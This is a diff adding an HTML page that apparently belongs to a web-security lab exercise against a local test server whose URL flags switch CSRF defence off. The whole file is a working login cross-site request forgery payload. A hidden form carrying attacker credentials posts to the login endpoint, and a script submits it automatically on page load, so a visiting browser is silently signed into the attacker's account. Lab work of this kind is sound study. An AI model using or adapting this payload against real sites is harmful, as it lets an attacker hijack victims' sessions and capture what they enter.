@@ -1,0 +1,12 @@
+
+    <html>
+        <body>
+            <form action="http://127.0.0.5:8080/login?csrfdefense=0&xssdefense=4" method = "POST">
+                <input id="username" name = "username" value="attacker">
+                <input id="userpass" name = "password" value="URpwn3d">
+            </form>
+            <script>
+                document.forms[0].submit();
+            </script>
+        </body>
+    </html>
